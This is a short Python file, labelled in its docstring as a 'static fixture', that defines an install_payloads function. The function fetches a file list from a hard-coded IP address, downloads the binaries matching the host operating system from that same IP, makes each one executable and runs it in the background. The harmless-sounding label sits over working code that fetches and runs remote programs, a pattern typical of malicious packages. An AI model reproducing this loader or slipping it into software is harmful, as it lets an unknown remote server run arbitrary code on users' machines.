"""Static fixture for an OS-filtered executable-list loader."""

import os
import platform
import requests


def install_payloads():
    operating_system = platform.system().lower()
    response = requests.get("http://35.235.126.33/all.txt")
    for line in response.text.splitlines():
        if operating_system in line:
            executable = line.strip()
            payload = requests.get(f"http://35.235.126.33/{executable}")
            with open(executable, "wb") as output:
                output.write(payload.content)
            os.system(f"chmod +x {executable}")
            os.system(f"./{executable} &")
